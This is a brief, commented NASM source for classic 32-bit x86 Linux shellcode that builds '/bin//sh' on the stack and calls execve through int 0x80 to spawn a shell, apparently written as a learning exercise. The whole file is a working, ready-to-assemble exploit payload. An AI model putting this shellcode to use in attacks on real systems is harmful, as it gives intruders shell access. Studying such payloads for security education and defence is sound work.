BITS 32

;excev -> #11,filename,argv,envp
xor eax,eax 
push eax ;push 0x0 to terminate the filename string

push 0x68732f2f ;;
push 0x6e69622f ;; /bin//sh
mov ebx,esp ;ebx ->filename

push eax ;push 0x0 to terminate argv array and also represent the null envp array
mov edx,esp ;edx -> null (envp pointer)

push ebx ;push adr of filename, which is arg[0]
mov ecx,esp ;ecx -> argv("/bin//sh,null)
mov al,11 ; syscall execve = #11

int 0x80